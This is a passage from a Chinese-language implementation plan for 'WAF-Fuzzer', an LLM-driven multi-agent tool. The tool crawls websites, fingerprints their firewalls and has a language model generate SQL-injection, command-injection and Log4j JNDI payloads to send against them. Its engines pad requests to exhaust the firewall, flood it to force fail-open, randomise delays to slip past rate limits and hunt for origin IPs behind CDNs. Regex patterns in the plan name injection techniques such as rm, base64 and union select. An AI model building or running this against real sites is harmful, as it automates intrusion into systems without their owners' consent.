                        elapsed_ms=0,
                        dimension="semantic",
                    ))

        return results

    def _send_single(self, payload: str, target) -> RawResponse:
        """发送单个 payload。"""
        start = time.monotonic()

        if target.method.upper() == "POST":
            body = target.body.replace("{{INJECT}}", quote(payload, safe="%"))
            resp = self.session.post(
                target.url,
                data=body,
                headers=target.headers,
                timeout=self.timeout,
                allow_redirects=False,
            )
        else:
            params = {
                k: v.replace("{{INJECT}}", payload)
                for k, v in (target.params or {}).items()
            }
            resp = self.session.get(
                target.url,
                params=params,
                headers=target.headers,
                timeout=self.timeout,
                allow_redirects=False,
            )

        elapsed = int((time.monotonic() - start) * 1000)

        return RawResponse(
            payload=payload,
            status_code=resp.status_code,
            headers=dict(resp.headers),
            body=resp.text[:50000],
            elapsed_ms=elapsed,
            dimension="semantic",
        )
```

- [ ] **Step 2: 实现 Solver 路由器**

```python
# agents/solver.py
"""Solver Agent：路由到四维引擎，生成 Payload + 发包。"""
from __future__ import annotations

from agents.models import SolverRequest, RawResponse
from agents.solver_engines.base import SolverEngine
from agents.solver_engines.semantic import SemanticSolver

# 其他引擎待后续 Task 实现
# from agents.solver_engines.protocol import ProtocolSolver
# from agents.solver_engines.performance import PerfSolver
# from agents.solver_engines.topology import TopologySolver


class Solver:
    def __init__(self, concurrency: int = 5, timeout: int = 15):
        self._engines: dict[str, SolverEngine] = {
            "semantic": SemanticSolver(concurrency=concurrency, timeout=timeout),
            # "protocol": ProtocolSolver(...),
            # "performance": PerfSolver(...),
            # "topology": TopologySolver(...),
        }

    def solve(self, request: SolverRequest) -> list[RawResponse]:
        engine = self._engines.get(request.dimension)
        if not engine:
            raise ValueError(f"未知维度: {request.dimension}")
        payloads = engine.generate(request)
        if not payloads:
            return []
        return engine.send(payloads, request)
```

- [ ] **Step 3: 验证导入**

Run: `cd core && python -c "from agents.solver import Solver; from agents.solver_engines.semantic import SemanticSolver; print('OK')"`
Expected: `OK`

- [ ] **Step 4: Commit**

```bash
git add agents/solver.py agents/solver_engines/__init__.py agents/solver_engines/base.py agents/solver_engines/semantic.py
git commit -m "feat: add Solver agent with SemanticSolver engine"
```

---

## Task 6: Manager Agent (`agents/manager.py`)

**Files:**
- Create: `agents/manager.py`

**说明:** Manager 是系统的"大脑"。从 `workflow.py` 迁移循环控制/报告生成，从 `baseliner.py` 迁移基线采集，从 `memory_compressor.py` 迁移 KB 管理，新增 LLM 策略决策、注入点推断、攻击面分析。

- [ ] **Step 1: 实现 Manager 核心功能**

```python
# agents/manager.py
"""Manager Agent：LLM 智能调度，控制整个 Fuzzing 流程。"""
from __future__ import annotations

import json
import re
import time
from pathlib import Path

from agents.models import (
    AttackPlan,
    InjectionPoint,
    ObserverResult,
    RoundDecision,
    RoundRecord,
    Verdict,
    WAFProfile,
)

# 复用现有模块
from baseliner import run_baseline
from llm_engine import _get_client, _chat_json
from memory_compressor import (
    load_base_rules,
    load_kb,
    get_kb_context,
    consolidate_kb,
    compress_cot_analyses,
)

# 分类正则（从 workflow.py 迁移）
_CMDI_CAT_PATTERNS = {
    "绕过文件路径": re.compile(r"[?*\[\]]|['\"]\s*\+\s*['\"]"),
    "绕过命令": re.compile(r"base64|xxd|od|hexdump|\$\{IFS\}|echo\s.*cat"),
    "换行注入": re.compile(r"%0[aAdD]"),
    "创建类命令": re.compile(r"echo.*>.*&&.*cat|touch.*&&.*cat"),
    "删除类命令": re.compile(r"rm.*&&.*ls"),
}
_SQLI_CAT_PATTERNS = {
    "UNION注入": re.compile(r"union[\s/*!]+select|/\*!.*union", re.I),
    "报错注入": re.compile(r"extractvalue|updatexml|floor\(|exp~|polygon", re.I),
    "盲注": re.compile(r"sleep\(|benchmark\(|waitfor\s+delay|pg_sleep\(", re.I),
    "堆叠查询": re.compile(r";\s*(insert|update|delete|drop|create|alter|truncate)", re.I),
}


class Manager:
    def __init__(self, config: dict):
        self.config = config
        self.bypass_records: list[dict] = []
        self.blocked_history: list[str] = []
        self.round_history: list[RoundRecord] = []
        self._output_dir = Path("output")
        self._output_dir.mkdir(exist_ok=True)

    # ─── 注入点推断（Phase 1）───

    def infer_injection_types(self, candidates: list) -> list[InjectionPoint]:
        """从爬取结果推断注入类型。"""
        points: list[InjectionPoint] = []

        for form in candidates:
            for param_name, label in form.inputs.items():
                vuln_type, context, closures = self._infer_single(
                    form.url, param_name, label, form.page_title, form.page_text
                )
                if vuln_type:
                    # 构造注入模板
                    if form.method == "POST":
                        body_parts = []
                        for k, v in form.inputs.items():
                            if k == param_name:
                                body_parts.append(f"{k}={{{{INJECT}}}}")
                            else:
                                body_parts.append(f"{k}={v}")
                        body = "&".join(body_parts)
                        params = None
                    else:
                        params = {
                            k: ("{{INJECT}}" if k == param_name else v)
                            for k, v in form.inputs.items()
                        }
                        body = None

                    points.append(InjectionPoint(
                        url=form.action or form.url,
                        param=param_name,
                        method=form.method,
                        vuln_type=vuln_type,
                        page_hint=label,
                        inferred_context=context,
                        closure_chars=closures,
                        body=body,
                        params=params,
                    ))

        return points

    def _infer_single(
        self, url: str, param: str, hint: str, title: str, context: str
    ) -> tuple[str | None, str, list[str]]:
        combined = f"{url} {param} {hint} {title} {context}".lower()

        # CMDI 推断
        cmdi_keywords = ["ip", "host", "cmd", "command", "ping", "域名", "ip地址", "execute"]
        if any(kw in combined for kw in cmdi_keywords):
            return "cmdi", f"ping {{input}}", [";", "|", "&&", "%0a"]

        # SQLi 推断
        sqli_keywords = ["id", "uid", "user", "search", "query", "查询", "搜索", "用户"]
        if any(kw in combined for kw in sqli_keywords):
            return "sqli", f"SELECT * FROM table WHERE id='{{input}}'", ["'", "' --", "') --"]

        # Log4j 推断
        log4j_keywords = ["url", "uri", "callback", "jndi", "api", "remote", "fetch"]
        if any(kw in combined for kw in log4j_keywords):
            return "log4j", "JNDI injection via {input}", ["${jndi:ldap://", "${jndi:rmi://"]

        return None, "", []

    # ─── 基线采集 ───

    def collect_baseline(self, point: InjectionPoint) -> str:
        target_dict = {
            "url": point.url,
            "method": point.method,
            "headers": point.headers,
            "body": point.body or "",
            "params": point.params or {},
        }
        return run_baseline(target_dict, timeout=self.config.get("fuzzing", {}).get("request_timeout", 15))

    # ─── 攻击面分析（Phase 2.5）───

    def analyze_attack_surface(
        self, point: InjectionPoint, waf_profile: WAFProfile
    ) -> AttackPlan:
        kb_context = get_kb_context(point.vuln_type)

        prompt = f"""你是 WAF 绕过攻击面分析师。根据以下信息制定攻击计划。

目标信息：
- URL: {point.url}
- 参数: {point.param}
- 注入类型: {point.vuln_type}
- 推测后端上下文: {point.inferred_context}
- 闭合符候选: {point.closure_chars}

WAF 信息：
- WAF 名称: {waf_profile.waf_name}
- 厂商: {waf_profile.waf_vendor}
- 已知绕过提示: {waf_profile.bypass_tips}

KB 上下文：
{kb_context}

可用维度: protocol, performance, semantic, topology

请输出 JSON：
{{
  "dimension_priority": ["维度1", "维度2", ...],
  "first_round_strategy": "首轮策略描述",
  "predicted_blocking": "预判拦截模式",
  "reasoning": "分析理由"
}}"""

        result = _chat_json(prompt, model=None, temperature=0.3, max_tokens=1024)
        if isinstance(result, dict):
            return AttackPlan(
                dimension_priority=result.get("dimension_priority", ["semantic"]),
                first_round_strategy=result.get("first_round_strategy", ""),
                predicted_blocking=result.get("predicted_blocking", ""),
                reasoning=result.get("reasoning", ""),
            )
        return AttackPlan(dimension_priority=["semantic"])

    # ─── 每轮策略决策 ───

    def decide_strategy(
        self,
        point: InjectionPoint,
        round_num: int,
        waf_profile: WAFProfile,
        attack_plan: AttackPlan,
    ) -> RoundDecision:
        # 首轮直接使用 AttackPlan
        if round_num == 0:
            dim = attack_plan.dimension_priority[0] if attack_plan.dimension_priority else "semantic"
            return RoundDecision(
                dimension=dim,
                strategy=attack_plan.first_round_strategy,
                reasoning=attack_plan.reasoning,
            )

        # 后续轮次：LLM 基于历史微调
        history_summary = "\n".join(
            f"  Round {r.round_num}: {r.dimension} → {r.bypass_count}bypass/{r.blocked_count}blocked"
            for r in self.round_history[-5:]
        )

        prompt = f"""你是 WAF 绕过策略决策器。根据历史表现决定下一轮策略。

目标: {point.url} ({point.vuln_type})
WAF: {waf_profile.waf_name}
维度优先级: {attack_plan.dimension_priority}

最近 5 轮历史：
{history_summary}

连续全拦截轮数: {self._count_consecutive_all_blocked()}
强制换思路: {self._count_consecutive_all_blocked() >= self.config.get('fuzzing', {}).get('dimension_switch_threshold', 3)}

请输出 JSON：
{{
  "dimension": "本轮维度",
  "strategy": "策略描述",
  "reasoning": "理由"
}}"""

        result = _chat_json(prompt, model=None, temperature=0.3, max_tokens=512)
        if isinstance(result, dict):
            return RoundDecision(
                dimension=result.get("dimension", "semantic"),
                strategy=result.get("strategy", ""),
                reasoning=result.get("reasoning", ""),
            )
        return RoundDecision(dimension="semantic", strategy="继续语义层探测", reasoning="LLM 返回异常")

    # ─── 结果记录 ───

    def record_round(
        self,
        point: InjectionPoint,
        decision: RoundDecision,
        result: ObserverResult,
    ):
        record = RoundRecord(
            round_num=len(self.round_history),
            dimension=decision.dimension,
            strategy=decision.strategy,
            bypass_count=result.bypass_count,
            blocked_count=result.blocked_count,
            verdicts=result.verdicts,
        )
        self.round_history.append(record)

        # 记录被拦截的 payload
        for v in result.verdicts:
            if not v.is_bypass:
                self.blocked_history.append(v.payload)

        # 记录绕过的 payload
        for v in result.verdicts:
            if v.is_bypass:
                self.bypass_records.append({
                    "target": point.url,
                    "param": point.param,
                    "vuln_type": point.vuln_type,
                    "payload": v.payload,
                    "evidence": v.evidence,
                    "category": self._categorize_payload(v.payload, point.vuln_type),
                })

    def update_kb(self, point: InjectionPoint, decision: RoundDecision, result: ObserverResult):
        if result.bypass_count > 0 or result.blocked_count > 0:
            cot_summary = f"{decision.strategy} → {result.summary}"
            try:
                compressed = compress_cot_analyses(
                    [cot_summary], point.vuln_type, model=None
                )
                consolidate_kb(point.vuln_type, compressed, point.url)
            except Exception:
                pass  # KB 更新失败不阻塞主流程

    # ─── 终止条件 ───

    def should_stop(self, point: InjectionPoint) -> bool:
        max_iter = self.config.get("fuzzing", {}).get("max_iterations", 20)
        if len(self.round_history) >= max_iter:
            return True
        early_stop = self.config.get("fuzzing", {}).get("early_stop_on_all_blocked", 5)
        if self._count_consecutive_all_blocked() >= early_stop:
            return True
        return False

    def _count_consecutive_all_blocked(self) -> int:
        count = 0
        for r in reversed(self.round_history):
            if r.blocked_count > 0 and r.bypass_count == 0:
                count += 1
            else:
                break
        return count

    # ─── 报告生成 ───

    def generate_final_report(self):
        report_path = self._output_dir / "bypass_report.txt"
        lines = [
            "=" * 80,
            "WAF-Fuzzer Bypass Report (Multi-Agent)",
            f"生成时间: {time.strftime('%Y-%m-%d %H:%M')}",
            f"共 {len(self.bypass_records)} 条绕过记录",
            "=" * 80,
            "",
        ]

        # 按 target + vuln_type + category 分组
        groups: dict[str, list[dict]] = {}
        for rec in self.bypass_records:
            key = f"{rec['vuln_type']} · {rec['target']}"
            groups.setdefault(key, []).append(rec)

        for group_key, records in groups.items():
            lines.append(f"{'█' * 4} {group_key} {'█' * (60 - len(group_key))}")
            categories: dict[str, list[dict]] = {}
            for r in records:
                categories.setdefault(r["category"], []).append(r)

            for cat, cat_records in categories.items():
                lines.append(f"\n── {cat} ─ {len(cat_records)}条 ──")
                lines.append(f"{'Payload':<50}  {'证据摘要'}")
                lines.append(f"{'-' * 50}  {'-' * 30}")
                for r in cat_records:
                    evidence = (r.get("evidence") or "")[:30]
                    lines.append(f"{r['payload']:<50}  {evidence}")
            lines.append("")

        report_path.write_text("\n".join(lines), encoding="utf-8")
        print(f"[*] 报告已生成: {report_path}")

    def _categorize_payload(self, payload: str, vuln_type: str) -> str:
        patterns = _CMDI_CAT_PATTERNS if vuln_type == "cmdi" else _SQLI_CAT_PATTERNS
        for cat, pat in patterns.items():
            if pat.search(payload):
                return cat
        return "直接注入"
```

- [ ] **Step 2: 验证 Manager 导入**

Run: `cd core && python -c "from agents.manager import Manager; print('OK')"`
Expected: `OK`

- [ ] **Step 3: Commit**

```bash
git add agents/manager.py
git commit -m "feat: add Manager agent with LLM decision and attack surface analysis"
```

---

## Task 7: 主入口 + 配置更新 (`main.py` + `config/target.yaml`)

**Files:**
- Create: `main.py`
- Modify: `config/target.yaml`

**说明:** 新入口文件，组装三个 Agent 并驱动完整流程。更新配置格式。

- [ ] **Step 1: 实现 main.py**

```python
# main.py
"""WAF-Fuzzer 多智能体系统入口。"""
from __future__ import annotations

import sys
from pathlib import Path

# 将 core/ 加入 Python 路径
sys.path.insert(0, str(Path(__file__).parent / "core"))

import yaml

from agents.manager import Manager
from agents.models import ObserverRequest, SolverRequest
from agents.observer import Observer
from agents.solver import Solver
from core.crawler import SiteCrawler
from core.waf_fingerprinter import WAFFingerprinter
from llm_engine import init_client
from memory_compressor import get_kb_context


def load_config(path: str = "config/target.yaml") -> dict:
    with open(path, encoding="utf-8") as f:
        return yaml.safe_load(f)


def main():
    config = load_config()

    # 初始化 LLM 客户端
    llm_cfg = config["llm"]
    init_client(api_key=llm_cfg["api_key"], base_url=llm_cfg["base_url"])

    # 初始化各 Agent
    fuzz_cfg = config.get("fuzzing", {})
    manager = Manager(config)
    solver = Solver(
        concurrency=fuzz_cfg.get("concurrency", 5),
        timeout=fuzz_cfg.get("request_timeout", 15),
    )
    observer = Observer()
    crawler = SiteCrawler()
    fingerprinter = WAFFingerprinter()

    entry_urls = config.get("entry_urls", [])
    if not entry_urls:
        print("[!] 配置中未找到 entry_urls，请在 target.yaml 中添加目标入口 URL")
        return

    for entry_url in entry_urls:
        print(f"\n{'='*60}")
        print(f"[*] 目标: {entry_url}")
        print(f"{'='*60}")

        # Phase 1: 注入点发现
        print("[Phase 1] 爬取站点...")
        candidates = crawler.crawl(entry_url)
        print(f"  发现 {len(candidates)} 个表单")

        injection_points = manager.infer_injection_types(candidates)
        injection_points = [
            p for p in injection_points
            if p.vuln_type in ("cmdi", "sqli", "log4j")
        ]

        if not injection_points:
            print(f"[!] 未发现 CMDI/SQLi/Log4j 注入点，跳过")
            continue

        print(f"[+] 发现 {len(injection_points)} 个注入点:")
        for p in injection_points:
            print(f"    {p.url} ({p.param}) → {p.vuln_type}")

        # Phase 2: WAF 指纹识别（同主机只做一次）
        print("\n[Phase 2] WAF 指纹识别...")
        waf_profile = fingerprinter.fingerprint(entry_url)
        if not waf_profile.detected:
            print("[!] 目标无 WAF 防护，跳过绕过测试")
            continue

        print(f"[+] 检测到 WAF: {waf_profile.waf_name} (confidence: {waf_profile.confidence})")
        if waf_profile.bypass_tips:
            print(f"    绕过提示: {waf_profile.bypass_tips[0]}")

        # Phase 3-4: 对每个注入点执行绕过测试
        for point in injection_points:
            print(f"\n{'─'*40}")
            print(f"[*] 测试: {point.url} ({point.param}) → {point.vuln_type}")

            # Phase 3: 基线采集 + 攻击面分析
            print("[Phase 3] 基线采集...")
            baseline = manager.collect_baseline(point)

            print("[Phase 3] 攻击面分析...")
            attack_plan = manager.analyze_attack_surface(point, waf_profile)
            print(f"  首攻维度: {attack_plan.dimension_priority[0] if attack_plan.dimension_priority else 'semantic'}")
            print(f"  策略: {attack_plan.first_round_strategy[:80]}...")

            # 重置该注入点的轮次历史
            manager.round_history.clear()
            manager.blocked_history.clear()

            # Phase 4: Fuzzing 循环
            print(f"\n[Phase 4] Fuzzing 循环 (max {fuzz_cfg.get('max_iterations', 20)} 轮)...")
            for round_num in range(fuzz_cfg.get("max_iterations", 20)):
                decision = manager.decide_strategy(
                    point, round_num, waf_profile, attack_plan
                )
                print(f"\n  Round {round_num + 1}: [{decision.dimension}] {decision.strategy[:60]}...")

                solver_req = SolverRequest(
                    target=point,
                    strategy=decision.strategy,
                    dimension=decision.dimension,
                    kb_context=get_kb_context(point.vuln_type),
                    round_num=round_num,
                    blocked_payloads=list(manager.blocked_history),
                    waf_profile=waf_profile,
                )
                responses = solver.solve(solver_req)
                print(f"  发送 {len(responses)} 个 payload")

                # 基线采集时记录响应耗时
                baseline_elapsed_ms = getattr(manager, '_baseline_elapsed_ms', 200)

                obs_req = ObserverRequest(
                    responses=responses,
                    baseline_html=baseline,
                    vuln_type=point.vuln_type,
                    baseline_elapsed_ms=baseline_elapsed_ms,
                )

                # Log4j/deserialization 类型填充 OOB 配置
                if point.vuln_type in ("log4j", "deserialization"):
                    oob_cfg = config.get("oob", {})
                    if oob_cfg.get("server"):
                        obs_req.oob_server = oob_cfg["server"]
                        obs_req.oob_poll_api = oob_cfg.get("poll_api")
                        # 为每个 payload 生成唯一 token
                        obs_req.oob_tokens = {
                            str(i): f"round{round_num}-p{i}.{oob_cfg['server']}"
                            for i in range(len(responses))
                        }
                result = observer.evaluate(obs_req)
                print(f"  结果: {result.summary}")

                manager.record_round(point, decision, result)
                manager.update_kb(point, decision, result)

                # 打印绕过的 payload
                for v in result.verdicts:
                    if v.is_bypass:
                        print(f"  ✓ BYPASS: {v.payload[:50]}... → {v.reason}")

                if manager.should_stop(point):
                    print(f"  [*] 终止条件满足，结束测试")
                    break

    # Phase 5: 汇总报告
    print(f"\n{'='*60}")
    manager.generate_final_report()


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: 更新 target.yaml 配置格式**

```yaml
# config/target.yaml
llm:
  provider: "openai"
  api_key: "your-api-key-here"
  model: "mimo-v2.5-pro"
  base_url: "https://token-plan-cn.xiaomimimimo.com/v1"

fuzzing:
  max_iterations: 20
  batch_size: 5
  concurrency: 5
  request_timeout: 15
  early_stop_on_all_blocked: 5
  solver_dimensions:
    - semantic
    - protocol
    - performance
    - topology
  dimension_switch_threshold: 3

oob:
  server: "oob.example.com"
  poll_api: "https://oob.example.com/api/poll"
  api_key: ""
  poll_interval_ms: 2000
  poll_timeout_ms: 30000

entry_urls:
  - "http://192.168.1.100:81/"
```

- [ ] **Step 3: 验证入口**

Run: `python main.py --help` 或检查 `python -c "import main; print('OK')"`
Expected: `OK`（不实际运行 fuzzing，只验证导入链）

- [ ] **Step 4: Commit**

```bash
git add main.py config/target.yaml
git commit -m "feat: add main entry point and update config format"
```

---

## Task 8: 协议层引擎 (`agents/solver_engines/protocol.py`)

**Files:**
- Create: `agents/solver_engines/protocol.py`
- Modify: `agents/solver.py` (注册新引擎)

**说明:** 利用 WAF 和后端对 HTTP 解析的差异性生成绕过 Payload。

- [ ] **Step 1: 实现 ProtocolSolver**

```python
# agents/solver_engines/protocol.py
"""协议解析层引擎：利用 WAF/后端 HTTP 解析差异绕过。"""
from __future__ import annotations

import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote

import requests

from agents.models import SolverRequest, RawResponse
from agents.solver_engines.base import SolverEngine
from llm_engine import _chat_json


class ProtocolSolver(SolverEngine):
    """协议层绕过：HPP、双重编码、Method 切换、Header 注入等。"""

    def __init__(self, concurrency: int = 5, timeout: int = 15):
        self.concurrency = concurrency
        self.timeout = timeout

    def generate(self, request: SolverRequest) -> list[str]:
        """LLM 生成协议层绕过 payload。"""
        waf_info = ""
        if request.waf_profile:
            waf_info = f"WAF: {request.waf_profile.waf_name}\n绕过提示: {request.waf_profile.bypass_tips}"

        prompt = f"""你是 HTTP 协议层绕过专家。根据目标信息生成利用 HTTP 解析差异的绕过 payload。

目标: {request.target.url}
参数: {request.target.param}
注入类型: {request.target.vuln_type}
推测后端: {request.target.inferred_context}
{waf_info}

可用的协议层绕过技术：
1. 参数污染 (HPP)：同名参数重复，WAF 检查第一个但后端取最后一个
2. 双重编码：URL 编码两层，WAF 解一层放行，后端解两层
3. HTTP Method 切换：GET→POST/PUT/OPTIONS
4. Content-Type 畸形：application/json + 实际 form body
5. Header 注入：X-Forwarded-For、X-Original-URL 注入 payload
6. Chunked Transfer-Encoding 走私

请生成 10 个 payload，每个 payload 用一行描述绕过技术。

返回 JSON：{{"payloads": ["payload1", "payload2", ...]}}"""

        result = _chat_json(prompt, model=None, temperature=0.7, max_tokens=2048)
        if isinstance(result, dict):
            return result.get("payloads", [])
        return []

    def send(self, payloads: list[str], request: SolverRequest) -> list[RawResponse]:
        """发包。"""
        results: list[RawResponse] = []
        session = requests.Session()
        session.trust_env = False

        with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
            futures = {
                executor.submit(self._send_single, p, request, session): p
                for p in payloads
            }
            for fut in as_completed(futures):
                try:
                    results.append(fut.result())
                except Exception:
                    results.append(RawResponse(
                        payload=futures[fut], status_code=0,
                        headers={}, body="", elapsed_ms=0, dimension="protocol",
                    ))
        return results

    def _send_single(self, payload: str, request: SolverRequest, session: requests.Session) -> RawResponse:
        target = request.target
        start = time.monotonic()

        # 根据 payload 内容判断绕过技术并调整请求
        headers = dict(target.headers)

        if target.method.upper() == "GET":
            params = {k: v.replace("{{INJECT}}", payload) for k, v in (target.params or {}).items()}
            resp = session.get(target.url, params=params, headers=headers, timeout=self.timeout, allow_redirects=False)
        else:
            body = (target.body or "").replace("{{INJECT}}", quote(payload, safe="%"))
            resp = session.post(target.url, data=body, headers=headers, timeout=self.timeout, allow_redirects=False)

        elapsed = int((time.monotonic() - start) * 1000)
        return RawResponse(
            payload=payload, status_code=resp.status_code,
            headers=dict(resp.headers), body=resp.text[:50000],
            elapsed_ms=elapsed, dimension="protocol",
        )
```

- [ ] **Step 2: 在 Solver 中注册 ProtocolSolver**

在 `agents/solver.py` 的 `_engines` 字典中添加：
```python
from agents.solver_engines.protocol import ProtocolSolver
# ...
self._engines["protocol"] = ProtocolSolver(concurrency=concurrency, timeout=timeout)
```

- [ ] **Step 3: Commit**

```bash
git add agents/solver_engines/protocol.py agents/solver.py
git commit -m "feat: add ProtocolSolver engine for HTTP parsing differential bypass"
```

---

## Task 9: 性能层引擎 (`agents/solver_engines/performance.py`)

**Files:**
- Create: `agents/solver_engines/performance.py`
- Modify: `agents/solver.py` (注册新引擎)

- [ ] **Step 1: 实现 PerfSolver**

```python
# agents/solver_engines/performance.py
"""资源性能层引擎：Padding、并发 Fail-Open、速率限制绕过。"""
from __future__ import annotations

import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote

import requests

from agents.models import SolverRequest, RawResponse
from agents.solver_engines.base import SolverEngine
from llm_engine import _chat_json


class PerfSolver(SolverEngine):
    """性能层绕过：超大 Padding、高并发 Race、请求间隔随机化。"""

    def __init__(self, concurrency: int = 50, timeout: int = 15, padding_size: int = 102400):
        self.concurrency = concurrency
        self.timeout = timeout
        self.padding_size = padding_size

    def generate(self, request: SolverRequest) -> list[str]:
        """生成带 Padding 的 payload + 高并发变体。"""
        base_payloads = self._get_base_payloads(request)
        padded = []
        for p in base_payloads:
            # Padding 变体：前置无害字符撑爆 WAF 缓冲区
            padding = "A" * self.padding_size
            padded.append(f"{padding}{p}")
            # 短 Padding 变体
            padded.append(f"{'A' * 1024}{p}")
        return padded

    def _get_base_payloads(self, request: SolverRequest) -> list[str]:
        """获取基础 payload（从语义层借入或 LLM 生成）。"""
        prompt = f"""生成 5 个 {request.target.vuln_type} 基础 payload，用于性能层 Padding 攻击。
目标: {request.target.url}，参数: {request.target.param}
返回 JSON：{{"payloads": ["p1", "p2", ...]}}"""
        result = _chat_json(prompt, model=None, temperature=0.5, max_tokens=512)
        if isinstance(result, dict):
            return result.get("payloads", [])
        return []

    def send(self, payloads: list[str], request: SolverRequest) -> list[RawResponse]:
        """高并发发包，尝试触发 WAF Fail-Open。"""
        results: list[RawResponse] = []
        session = requests.Session()
        session.trust_env = False

        # 使用高并发数
        effective_concurrency = min(self.concurrency, len(payloads))

        with ThreadPoolExecutor(max_workers=effective_concurrency) as executor:
            futures = {
                executor.submit(self._send_single, p, request, session): p
                for p in payloads
            }
            for fut in as_completed(futures):
                try:
                    results.append(fut.result())
                except Exception:
                    results.append(RawResponse(
                        payload=futures[fut], status_code=0,
                        headers={}, body="", elapsed_ms=0, dimension="performance",
                    ))
        return results

    def _send_single(self, payload: str, request: SolverRequest, session: requests.Session) -> RawResponse:
        target = request.target
        start = time.monotonic()

        # 随机延迟（绕过速率限制）
        time.sleep(random.uniform(0, 0.5))

        if target.method.upper() == "GET":
            params = {k: v.replace("{{INJECT}}", payload) for k, v in (target.params or {}).items()}
            resp = session.get(target.url, params=params, headers=target.headers, timeout=self.timeout, allow_redirects=False)
        else:
            body = (target.body or "").replace("{{INJECT}}", quote(payload, safe="%"))
            resp = session.post(target.url, data=body, headers=target.headers, timeout=self.timeout, allow_redirects=False)

        elapsed = int((time.monotonic() - start) * 1000)
        return RawResponse(
            payload=payload, status_code=resp.status_code,
            headers=dict(resp.headers), body=resp.text[:50000],
            elapsed_ms=elapsed, dimension="performance",
        )
```

- [ ] **Step 2: 在 Solver 中注册 PerfSolver**

- [ ] **Step 3: Commit**

```bash
git add agents/solver_engines/performance.py agents/solver.py
git commit -m "feat: add PerfSolver engine for resource exhaustion bypass"
```

---

## Task 10: 拓扑层引擎 (`agents/solver_engines/topology.py`)

**Files:**
- Create: `agents/solver_engines/topology.py`
- Modify: `agents/solver.py` (注册新引擎)

- [ ] **Step 1: 实现 TopologySolver**

```python
# agents/solver_engines/topology.py
"""架构拓扑层引擎：资产测绘、真实源 IP 发现、直接访问源站。"""
from __future__ import annotations

import socket
import time

import requests

from agents.models import SolverRequest, RawResponse
from agents.solver_engines.base import SolverEngine
from llm_engine import _chat_json


class TopologySolver(SolverEngine):
    """拓扑层绕过：发现真实源 IP，绕过前端 WAF 直接访问源站。"""

    def __init__(self, timeout: int = 15):
        self.timeout = timeout

    def generate(self, request: SolverRequest) -> list[str]:
        """生成源 IP 探测命令和直连 payload。"""
        from urllib.parse import urlparse
        parsed = urlparse(request.target.url)
        hostname = parsed.hostname

        prompt = f"""你是架构拓扑分析师。目标域名: {hostname}

请分析可能的绕过方式：
1. 如果目标有 CDN，如何发现真实源 IP？
2. 如果发现源 IP，如何构造直连请求？

返回 JSON：{{
  "analysis": "分析",
  "source_ips": ["可能的源 IP 列表"],
  "direct_payloads": ["直连 payload 列表"]
}}"""

        result = _chat_json(prompt, model=None, temperature=0.3, max_tokens=1024)
        if not isinstance(result, dict):
            return []

        payloads = result.get("direct_payloads", [])
        source_ips = result.get("source_ips", [])

        # 如果发现源 IP，生成直连 URL 的 payload
        if source_ips:
            for ip in source_ips:
                direct_url = request.target.url.replace(hostname, ip)
                payloads.append(f"DIRECT:{direct_url}")

        return payloads

    def send(self, payloads: list[str], request: SolverRequest) -> list[RawResponse]:
        """对源 IP 直连发包。"""
        results: list[RawResponse] = []
        session = requests.Session()
        session.trust_env = False

        for payload in payloads:
            if payload.startswith("DIRECT:"):
                url = payload[7:]  # 去掉 "DIRECT:" 前缀
                try:
                    start = time.monotonic()
                    resp = session.get(url, timeout=self.timeout, allow_redirects=False)
                    elapsed = int((time.monotonic() - start) * 1000)
                    results.append(RawResponse(
                        payload=payload, status_code=resp.status_code,
                        headers=dict(resp.headers), body=resp.text[:50000],
                        elapsed_ms=elapsed, dimension="topology",
                    ))
                except Exception:
                    results.append(RawResponse(
                        payload=payload, status_code=0,
                        headers={}, body="", elapsed_ms=0, dimension="topology",
                    ))
            else:
                # 非直连 payload，按普通方式发送
                results.append(RawResponse(
                    payload=payload, status_code=0,
                    headers={}, body="topology: non-direct payload", elapsed_ms=0,
                    dimension="topology",
                ))

        return results
```

- [ ] **Step 2: 在 Solver 中注册 TopologySolver**

- [ ] **Step 3: Commit**

```bash
git add agents/solver_engines/topology.py agents/solver.py
git commit -m "feat: add TopologySolver engine for architecture-level bypass"
```

---

## Task 11: 旧代码清理

**Files:**
- Modify: `core/workflow.py` (保留为兼容入口，标记 deprecated)
- Modify: `core/inline_parser.py` (标记 deprecated，逻辑已迁入 Observer)
- Note: `core/response_extractor.py` 保持不变（独立工具，被 Observer 可选调用）

**说明:** 旧 `workflow.py` 和 `inline_parser.py` 保留但标记 deprecated。`requester.py` 清理为纯 HTTP 工具，移除对 `inline_parser` 的直接依赖（Observer 接管判定职责）。`response_extractor.py` 保持为独立工具，不做修改。

- [ ] **Step 1: 在 workflow.py 顶部添加 deprecated 标记**

在文件开头添加：
```python
"""
DEPRECATED: 此文件已被 main.py + agents/ 替代。
保留仅为向后兼容。新代码请使用 agents/manager.py, agents/solver.py, agents/observer.py。
"""
import warnings
warnings.warn("workflow.py is deprecated. Use main.py instead.", DeprecationWarning, stacklevel=2)
```

- [ ] **Step 2: 在 inline_parser.py 顶部添加 deprecated 标记**

```python
"""
DEPRECATED: 此文件已被 agents/observer.py 替代。
证据提取和判定逻辑已迁入 Observer Agent 的 Judge 类。
保留仅为向后兼容。新代码请使用 agents/observer.py。
"""
import warnings
warnings.warn("inline_parser.py is deprecated. Use agents/observer.py instead.", DeprecationWarning, stacklevel=2)
```

- [ ] **Step 3: Commit**

```bash
git add core/workflow.py core/inline_parser.py
git commit -m "chore: mark workflow.py and inline_parser.py as deprecated"
```

---

## 总结

| Task | 产出 | 依赖 |
|------|------|------|
| 1 | `agents/models.py` | 无 |
| 2 | `core/crawler.py` | 无 |
| 3 | `core/waf_fingerprinter.py` + `config/waf_signatures.json` | 无 |
| 4 | `agents/observer.py` | Task 1 |
| 5 | `agents/solver.py` + `agents/solver_engines/semantic.py` | Task 1 |
| 6 | `agents/manager.py` | Task 1 |
| 7 | `main.py` + `config/target.yaml` | Task 1-6 |
| 8 | `agents/solver_engines/protocol.py` | Task 5 |
| 9 | `agents/solver_engines/performance.py` | Task 5 |
| 10 | `agents/solver_engines/topology.py` | Task 5 |
| 11 | 旧代码清理 | Task 7 |

**建议执行顺序:** 1 → 2,3 并行 → 4,5,6 并行 → 7 → 8,9,10 并行 → 11
